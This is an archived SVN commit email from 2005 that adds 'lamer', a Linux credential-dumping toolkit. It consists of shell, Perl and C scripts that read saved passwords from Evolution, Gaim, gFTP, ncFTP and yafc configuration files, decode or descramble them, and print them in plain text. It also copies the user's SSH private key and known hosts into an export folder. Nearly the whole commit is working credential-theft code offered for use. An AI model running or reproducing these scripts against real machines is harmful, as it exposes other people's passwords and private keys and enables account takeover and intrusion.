@@ -1,0 +1,671 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Happyboom-svn] r108 - / lamer lamer/tool lamer/tool/src
+   </TITLE>
+   <LINK REL="Index" HREF="http://lists.berlios.de/pipermail/happyboom-svn/2005-September/index.html" >
+   <LINK REL="made" HREF="mailto:happyboom-svn%40lists.berlios.de?Subject=Re%3A%20%5BHappyboom-svn%5D%20r108%20-%20/%20lamer%20lamer/tool%20lamer/tool/src&In-Reply-To=%3C200509021506.j82F635r022772%40sheep.berlios.de%3E">
+   <META NAME="robots" CONTENT="index,nofollow">
+   <style type="text/css">
+       pre {
+           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
+           }
+   </style>
+   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
+   <LINK REL="Previous"  HREF="000014.html">
+   <LINK REL="Next"  HREF="000016.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Happyboom-svn] r108 - / lamer lamer/tool lamer/tool/src</H1>
+    <B>Victor STINNER at BerliOS</B> 
+    <A HREF="mailto:happyboom-svn%40lists.berlios.de?Subject=Re%3A%20%5BHappyboom-svn%5D%20r108%20-%20/%20lamer%20lamer/tool%20lamer/tool/src&In-Reply-To=%3C200509021506.j82F635r022772%40sheep.berlios.de%3E"
+       TITLE="[Happyboom-svn] r108 - / lamer lamer/tool lamer/tool/src">haypo at berlios.de
+       </A><BR>
+    <I>Fri Sep  2 17:06:03 CEST 2005</I>
+    <P><UL>
+        <LI>Previous message: <A HREF="000014.html">[Happyboom-svn] r107 - languetudes
+</A></li>
+        <LI>Next message: <A HREF="000016.html">[Happyboom-svn] r109 - lamer
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#17">[ date ]</a>
+              <a href="thread.html#17">[ thread ]</a>
+              <a href="subject.html#17">[ subject ]</a>
+              <a href="author.html#17">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>Author: haypo
+Date: 2005-09-02 17:06:02 +0200 (Fri, 02 Sep 2005)
+New Revision: 108
+
+Added:
+   lamer/
+   lamer/README
+   lamer/all.sh
+   lamer/clean.sh
+   lamer/mod_evolution.sh
+   lamer/mod_gaim.sh
+   lamer/mod_gftp.sh
+   lamer/mod_ncftp.sh
+   lamer/mod_ssh.sh
+   lamer/mod_yafc.sh
+   lamer/tool/
+   lamer/tool/common.sh
+   lamer/tool/evolution.pl
+   lamer/tool/firefox.pl
+   lamer/tool/gaim.pl
+   lamer/tool/gftp_bookmark.pl
+   lamer/tool/ncftp_bookmark.pl
+   lamer/tool/src/
+   lamer/tool/src/gftp_descramble.c
+   lamer/tool/yafc.pl
+Log:
+Ajoute l'outil lamer.
+
+
+Added: lamer/README
+===================================================================
+--- lamer/README	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/README	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,6 @@
++Hi, Lamer is a toolkit which can be used to list all password on a
++Linux computer. It decrypts each password.
++
++For each software, a &quot;mod_&lt;name&gt;.sh&quot; exists.
++
++Haypo
+
+Added: lamer/all.sh
+===================================================================
+--- lamer/all.sh	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/all.sh	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,4 @@
++#!/bin/sh
++for i in `find ./ -maxdepth 1 -type f -perm -700 -name 'mod_*' | grep -v '~'`; do
++  ./$i
++done
+
+
+Property changes on: lamer/all.sh
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/clean.sh
+===================================================================
+--- lamer/clean.sh	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/clean.sh	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,3 @@
++#!/bin/sh
++rm -rf export/
++find -name &quot;*~*&quot; -exec rm {} \;
+
+
+Property changes on: lamer/clean.sh
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/mod_evolution.sh
+===================================================================
+--- lamer/mod_evolution.sh	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/mod_evolution.sh	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,10 @@
++#!/bin/bash
++
++export MOD=evolution
++IN=~/.gnome2_private/Evolution
++if [ ! -e $IN ]; then exit 0; fi
++
++tool/common.sh
++
++tool/evolution.pl $IN
++
+
+
+Property changes on: lamer/mod_evolution.sh
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/mod_gaim.sh
+===================================================================
+--- lamer/mod_gaim.sh	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/mod_gaim.sh	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,10 @@
++#!/bin/bash
++
++export MOD=gaim
++IN=~/.gaim/accounts.xml
++if [ ! -e $IN ]; then exit 0; fi
++
++tool/common.sh
++
++tool/gaim.pl $IN
++
+
+
+Property changes on: lamer/mod_gaim.sh
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/mod_gftp.sh
+===================================================================
+--- lamer/mod_gftp.sh	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/mod_gftp.sh	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,12 @@
++#!/bin/sh
++
++export MOD=gftp
++DST=export/
++mkdir -p $DST
++IN=~/.gftp/bookmarks
++
++if [ ! -e $IN ]; then exit 0; fi
++
++tool/common.sh
++
++tool/gftp_bookmark.pl $IN | tee $DST/$MOD
+
+
+Property changes on: lamer/mod_gftp.sh
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/mod_ncftp.sh
+===================================================================
+--- lamer/mod_ncftp.sh	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/mod_ncftp.sh	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,11 @@
++#!/bin/bash
++
++export MOD=ncftp
++DST_DIR=export/
++mkdir -p $DST_DIR
++IN=~/.ncftp/bookmarks
++
++if [ ! -e $IN ]; then exit 0; fi
++tool/common.sh
++
++tail -n +3 $IN | tool/ncftp_bookmark.pl | tee $DST_DIR/$MOD
+
+
+Property changes on: lamer/mod_ncftp.sh
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/mod_ssh.sh
+===================================================================
+--- lamer/mod_ssh.sh	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/mod_ssh.sh	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,23 @@
++#!/bin/sh
++
++export MOD=&quot;ssh&quot;
++SSH_DIR=~/.ssh
++DST=./export/$MOD
++
++if [ ! -d $SSH_DIR ]; then exit 0; fi
++
++tool/common.sh
++
++mkdir -p $DST
++
++if [ $VERBOSE ]; then echo -n 'Known SSH hosts : '; fi
++
++cut -d' ' -f1 $SSH_DIR/known_hosts | sed 's/^\(.*\),.*$/\1/g'&gt; $DST/known_hosts
++
++if [ $VERBOSE ]; then 
++    for i in `cat $DST/known_hosts`; do echo -n &quot;$i, &quot;; done
++    echo 'copy SSH keys !'
++fi
++
++cp $SSH_DIR/id_rsa $DST/
++cp $SSH_DIR/id_rsa.pub $DST/
+\ No newline at end of file
+
+
+Property changes on: lamer/mod_ssh.sh
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/mod_yafc.sh
+===================================================================
+--- lamer/mod_yafc.sh	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/mod_yafc.sh	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,12 @@
++#!/bin/sh
++
++export MOD=yafc
++DST=export/
++mkdir -p $DST
++IN=~/.yafc/bookmarks
++
++if [ ! -e $IN ]; then exit 0; fi
++
++tool/common.sh
++
++tool/yafc.pl $IN | tee $DST/$MOD
+
+
+Property changes on: lamer/mod_yafc.sh
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/tool/common.sh
+===================================================================
+--- lamer/tool/common.sh	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/tool/common.sh	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,4 @@
++#!/bin/sh
++
++if [ $VERBOSE ]; then echo -e &quot;\n[ $MOD ]&quot;; fi
++mkdir -p export/
+
+
+Property changes on: lamer/tool/common.sh
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/tool/evolution.pl
+===================================================================
+--- lamer/tool/evolution.pl	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/tool/evolution.pl	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,41 @@
++#!/usr/bin/perl
++
++use MIME::Base64;
++
++# Read all accounts
++%accounts = ();
++open(FILE, $ARGV[0]);
++while (&lt;FILE&gt;) {
++    chomp();
++    if (/^(pop|imap):__([^@]+)@([^=_]+)=(.+)$/) { 
++		$protocol = $1;
++		$email = $2;
++		$server = $3;
++		$password = $4;
++		if ($email =~ /^([^;]+);auth_(.*)$/)
++		{
++			$email = $1;
++			$auth = $2;
++			$auth = &quot;&quot; if ($auth =~ /^\+APOP$/);
++		} else {
++			$auth = &quot;&quot;;
++		}
++		$password = decode_base64($password);
++		$email =~ s/%40/@/;
++
++		# Important key : skip duplicate accounts
++		$key = $server . &quot;:&quot; . $email;
++		if (not exists $accounts{$key})
++		{
++			$accounts{$key} = 1;
++			print &quot;$server : $email : \&quot;$password\&quot;\n&quot;;
++
++#			print &quot;Email $email\n&quot;;
++#			print &quot;- authentification: $auth\n&quot; if (! $auth =~ /^$/);
++#			print &quot;- protocol: $protocol\n&quot; if not($protocol =~ /^pop$/); 
++#			print &quot;- server: $server\n&quot;;
++#			print &quot;- password: $password\n&quot;;
++		}
++	}
++}
++close(FILE);
+
+
+Property changes on: lamer/tool/evolution.pl
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/tool/firefox.pl
+===================================================================
+--- lamer/tool/firefox.pl	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/tool/firefox.pl	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,54 @@
++#!/usr/bin/perl
++
++use MIME::Base64;
++
++$suite_serveur = 1;
++$suite_id_txt = 2;
++$suite_id = 3;
++$suite_pass_txt = 4;
++$suite_pass = 5;
++
++sub nv_idpass {
++    $user = '';
++    $pass = '';
++}
++
++sub nv_site {
++    $server = '';
++    $ligne = 0;
++    $suite = 0;
++}
++
++sub affiche {
++    if ($server eq '') { return; }
++    $server =~ s/ +\(.*\)$//;
++#     $lg_max = 16;
++#     $user =~ s/^.*(.{$lg_max})$/(...)\1/ if ($lg_max&lt;length($user));
++#     $pass =~ s/^.*(.{$lg_max})$/(...)\1/ if ($lg_max&lt;length($pass));
++    print (&quot;S=$server, U=$user, P=$pass\n&quot;);
++}
++
++nv_site();
++nv_idpass();
++open(FILE, $ARGV[0]);
++while (&lt;FILE&gt;) {
++    chomp();
++    next if (/^\#/);
++
++SWITCH: {
++    $suite++;
++    if (/^\./) { nv_site(); last SWITCH; }
++    if ($suite == $suite_serveur) { $server = $_; last SWITCH; }
++    if ($suite == $suite_id) { $user = $_; last SWITCH; }
++    if ($suite == $suite_pass) { 
++	$pass = $_; 
++	$suite = $suite_id_txt-1; 
++	affiche();
++	nv_idpass();
++	last SWITCH; 
++    }
++}
++
++    $ligne++;
++}
++close(AUTOCOMPLETE);
+
+
+Property changes on: lamer/tool/firefox.pl
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/tool/gaim.pl
+===================================================================
+--- lamer/tool/gaim.pl	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/tool/gaim.pl	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,28 @@
++#!/usr/bin/perl
++
++use XML::Simple;
++
++my $file = $ARGV[0];
++my $xs1 = XML::Simple-&gt;new();
++my $doc = $xs1-&gt;XMLin($file);
++
++%accounts = %{$doc-&gt;{account}};
++
++%human_protocol = (
++	'prpl-oscar' =&gt; &quot;ICQ&quot;,
++	'prpl-yahoo' =&gt; &quot;Yahoo&quot;,
++	'prpl-jabber' =&gt; &quot;Jabber&quot;,
++	'prpl-msn' =&gt; &quot;MSN&quot;
++);
++
++foreach my $key (keys %accounts){
++    $user = $key;
++    $item = $accounts{$key};
++    $protocol = $item-&gt;{protocol};
++	$protocol = $human_protocol{$protocol} if exists $human_protocol{$protocol};
++	
++    $pass = ($item-&gt;{password});
++    $pass = $pass ? '&quot;'.$pass.'&quot;' : &quot;&lt;unknow&gt;&quot;; 
++	
++    print &quot;$protocol : $user : $pass\n&quot;;
++}
+
+
+Property changes on: lamer/tool/gaim.pl
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/tool/gftp_bookmark.pl
+===================================================================
+--- lamer/tool/gftp_bookmark.pl	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/tool/gftp_bookmark.pl	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,50 @@
++#!/usr/bin/perl
++
++use Env qw(VERBOSE);
++
++sub urlEncode {
++    my ($string) = @_;
++    $string =~ s/(\W)/&quot;%&quot; . unpack(&quot;H2&quot;, $1)/ge;
++    #$string# =~ tr/.//;
++    return $string;
++ }
++
++sub nv_site {
++    $server = '';
++    $user = '';
++    $pass = '';
++    $port = 21;
++}
++
++sub affiche {
++    return if ($user =~ /^anonymous$/);
++
++    # D&#233;code le mode de passe
++    $pass = `tool/gftp_descramble '$pass'`;
++    chop $pass;
++
++    # Encode l'user et pass
++    $user = urlEncode($user);
++    $pass = urlEncode($pass);
++
++    # Affiche le FTP
++    print (&quot;<A HREF="ftp://$user:$pass\@$server:$port/\n">ftp://$user:$pass\@$server:$port/\n</A>&quot;);
++}
++
++$i = 1;
++nv_site();
++open(FILE, $ARGV[0]);
++while (&lt;FILE&gt;) {
++    $i++;
++    chomp();
++    push(@tab,$_);
++
++    if (/^\[/ &amp;&amp; $server) { affiche(); nv_site(); }
++    if (/^hostname=/) { $server = $'; }
++    if (/^port=/) { $port = $'; }
++    if (/^username=/) { $user = $'; }
++    if (/^password=/) { $pass = $'; }
++}
++close(AUTOCOMPLETE);
++
++affiche();
+
+
+Property changes on: lamer/tool/gftp_bookmark.pl
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/tool/ncftp_bookmark.pl
+===================================================================
+--- lamer/tool/ncftp_bookmark.pl	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/tool/ncftp_bookmark.pl	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,22 @@
++#!/usr/bin/perl
++# Decode ncftp bookmark file
++
++use MIME::Base64;
++
++while ($input = &lt;STDIN&gt;) {
++  if (! $input eq '') {
++    chop $input;
++    @tab = split(/,/, $input);
++    $id = $tab[2];
++    $server = $tab[1];
++    $pass = $tab[3];
++    $port = $tab[7];
++    if ( $pass =~/\*encoded\*/ ) {
++      $pass=~s/\*encoded\*//;
++      $pass = decode_base64($pass);
++    }
++    $pass =~ s/\0+$//;
++    print (&quot;<A HREF="ftp://$id:$pass\@$server:$port/\n">ftp://$id:$pass\@$server:$port/\n</A>&quot;);
++  }
++}
++
+
+
+Property changes on: lamer/tool/ncftp_bookmark.pl
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+Added: lamer/tool/src/gftp_descramble.c
+===================================================================
+--- lamer/tool/src/gftp_descramble.c	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/tool/src/gftp_descramble.c	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,53 @@
++#include &lt;stdio.h&gt;
++#include &lt;string.h&gt;
++#include &lt;stdlib.h&gt;
++
++char *
++gftp_descramble_password (const char *password)
++{
++  const char *passwordpos;
++  char *newstr, *newpos;
++  int error;
++
++  if (*password != '$') return strdup (password);
++
++  passwordpos = password + 1;
++  newstr = malloc(strlen (passwordpos) / 2 + 1);
++  newpos = newstr;
++ 
++  error = 0;
++  while (*passwordpos != '\0' &amp;&amp; (*passwordpos + 1) != '\0')
++    {
++      if ((*passwordpos &amp; 0xc3) != 0x41 ||
++          (*(passwordpos + 1) &amp; 0xc3) != 0x41)
++        {
++          error = 1;
++          break;
++        }
++
++      *newpos++ = ((*passwordpos &amp; 0x3c) &lt;&lt; 2) | 
++                  ((*(passwordpos + 1) &amp; 0x3c) &gt;&gt; 2);
++
++      passwordpos += 2;
++    }
++
++  if (error)
++    {
++      free (newstr);
++      return (strdup (password));
++    }
++
++  *newpos = '\0';
++  return (newstr);
++}
++
++int main(int argc, char **argv)
++{
++  if (argc != 2) {
++    fprintf(stderr, &quot;Need one argument : gftp crambled password.\n&quot;);
++    return 1;
++  }
++  char *txt = gftp_descramble_password(argv[1]);
++  printf (&quot;%s&quot;, txt);
++  return 0;
++}
+
+Added: lamer/tool/yafc.pl
+===================================================================
+--- lamer/tool/yafc.pl	2005-09-02 14:44:25 UTC (rev 107)
++++ lamer/tool/yafc.pl	2005-09-02 15:06:02 UTC (rev 108)
+@@ -0,0 +1,45 @@
++#!/usr/bin/perl
++
++use MIME::Base64;
++
++sub nv_site {
++    $server = '';
++    $user = '';
++    $pass = '';
++}
++
++sub affiche {
++    if ($server eq '') { return; }
++    $pass = decode_base64($') if ($pass =~ /^\[base64\]/);
++    print (&quot;<A HREF="ftp://$user:$pass\@$server/\n">ftp://$user:$pass\@$server/\n</A>&quot;);
++    nv_site();
++}
++
++nv_site();
++open(FILE, $ARGV[0]);
++while (&lt;FILE&gt;) {
++    chomp();
++    next if (/^\#/ || /^$/);
++
++    if ($server eq '') {
++	# Ligne du serveur
++	@mots = split ' ',$_;
++	$server = @mots[1];
++    } else {
++	# Ligne du user+pass
++	if (/^ +login (.*) password (.*)$/) { 
++	    $user=$1; 
++	    $pass=$2;
++	    affiche(); 
++	} if (/^ +anonymous$/) { 
++	    $user=&quot;anonymous&quot;; 
++	    $pass=&quot;&quot;;
++	    affiche(); 
++	} else { 
++	    print (&quot;Ligne non reconnue : $_\n&quot;); 
++	}
++    }
++    
++}
++close(AUTOCOMPLETE);
++affiche();
+
+
+Property changes on: lamer/tool/yafc.pl
+___________________________________________________________________
+Name: svn:executable
+   + *
+
+
+</PRE>
+
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI>Previous message: <A HREF="000014.html">[Happyboom-svn] r107 - languetudes
+</A></li>
+	<LI>Next message: <A HREF="000016.html">[Happyboom-svn] r109 - lamer
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#17">[ date ]</a>
+              <a href="thread.html#17">[ thread ]</a>
+              <a href="subject.html#17">[ subject ]</a>
+              <a href="author.html#17">[ author ]</a>
+         </LI>
+       </UL>
+
+<hr>
+<a href="https://lists.berlios.de/mailman/listinfo/happyboom-svn">More information about the Happyboom-svn
+mailing list</a><br>
+</body></html>
